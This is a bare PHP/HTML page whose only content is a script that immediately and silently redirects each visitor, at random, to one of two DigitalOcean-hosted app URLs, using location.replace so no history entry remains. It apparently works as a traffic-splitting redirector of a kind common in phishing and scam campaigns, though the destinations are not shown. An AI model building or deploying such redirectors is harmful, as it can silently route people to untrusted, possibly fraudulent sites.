<?php
  ?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Red...</title>

<script>
(function () {
    const urlA = "https://whale-app-o3dry.ondigitalocean.app/?Anph=(0101)-21735-08134";
    const urlB = "https://stingray-app-2-sboby.ondigitalocean.app/?Anph=(0101)-21735-08134";

    // 50-50 split
    const target = Math.random() < 0.5 ? urlA : urlB;

    // Instant redirect (no history)
    window.location.replace(target);
})();
</script>

</head>
<body>
</body>
</html>
